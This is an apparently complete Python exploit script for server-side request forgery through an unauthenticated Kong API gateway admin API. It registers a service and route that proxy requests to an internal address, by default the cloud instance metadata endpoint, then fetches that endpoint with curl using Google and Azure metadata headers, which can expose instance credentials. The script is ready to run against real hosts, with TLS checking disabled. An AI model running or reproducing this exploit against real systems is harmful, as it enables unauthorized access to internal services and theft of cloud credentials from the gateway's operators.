#!/usr/bin/env python
#
# Kong SSRF 
#
#
# By @RandomRobbieBF
# 
#

import requests
import json
import sys
import argparse
import re
import os.path
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
session = requests.Session()


parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", required=True,help="Kong APi url can be http or https")
parser.add_argument("-s", "--ssrf", default="http://169.254.169.254", required=False,help="What Internal URL to proxy http:// or https://")
parser.add_argument("-p", "--proxy",required=False, help="Proxy for debugging")

args = parser.parse_args()
url = args.url
proxy = args.proxy
ssrfurl = args.ssrf

if proxy:
	proxy = args.proxy
else:
	proxy = ""


http_proxy = proxy
proxyDict = { 
              "http"  : http_proxy, 
              "https" : http_proxy, 
              "ftp"   : http_proxy
            }
            


def add_service(url):
	paramsPost = {"name":"metadata-endpoint","url":""+ssrfurl+""}
	headers = {"User-Agent":"curl/7.64.1","Connection":"close","Accept":"*/*","Content-Type":"application/x-www-form-urlencoded"}
	response = session.post(""+url+"/services", data=paramsPost, headers=headers,verify=False, proxies=proxyDict)
	if response.status_code == 201:
		print ("[+] Service Added [+]")
		y = json.loads(response.text)
		try:
			id = y["id"]
			return id
		except:
			print ("[-] Error Parsing ID of new service  [-]")
			sys.exit(0)
	else:
		print("Error:\n\n"+response.text+"")
		sys.exit(0)
		


def add_route(url,id):
	paramsPostDict = {"hosts[]":"metadata.local","paths[]":"/foo","service.id":""+id+"","name":"metadata-endpoint"}
	paramsPost = "&".join("%s=%s" % (k,v) for k,v in paramsPostDict.items())
	headers = {"User-Agent":"curl/7.64.1","Connection":"close","Accept":"*/*","Content-Type":"application/x-www-form-urlencoded"}
	response = session.post(""+url+"/routes/", data=paramsPost, headers=headers,verify=False, proxies=proxyDict)
	if response.status_code == 201:
		print ("[+] Route Added [+]")
		y = json.loads(response.text)
		rid = y["id"]
		t = url.replace(":8001","")
		print("\n[+] Testing Kong for Metadata Proxy")
		cmd = ('curl '+t+'/foo/ -H "Host: metadata.local" -H "Metadata: true" -H "Metadata-Flavor: Google"')
		print(cmd)
		os.system(cmd)
		print ("\n\n[+] To remove added routes and services do the following")
		print("curl -iX DELETE "+url+"/routes/metadata-endpoint")
		print("curl -iX DELETE "+url+"/services/metadata-endpoint")
		
	else:
		print("Error:\n\n"+response.text+"")
		sys.exit(0)
		


		

id = add_service(url)
add_route(url,id)	

